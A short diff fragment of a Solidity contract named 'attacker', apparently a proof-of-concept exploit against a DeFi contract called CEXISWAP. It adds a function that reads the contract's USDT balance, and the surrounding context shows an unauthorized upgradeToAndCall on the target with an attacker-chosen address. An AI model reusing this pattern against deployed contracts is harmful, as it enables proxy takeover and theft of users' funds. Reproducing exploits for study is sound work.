@@ -101,6 +101,10 @@ contract attacker {
         );
     }
 
+    function getUSDTBalance() public returns(uint256){
+        return USDT.balanceOf(address(this));
+    }
+
     function upgradeToAndCall(address _addr) external {
         CEXISWAP.upgradeToAndCall(
             _addr,
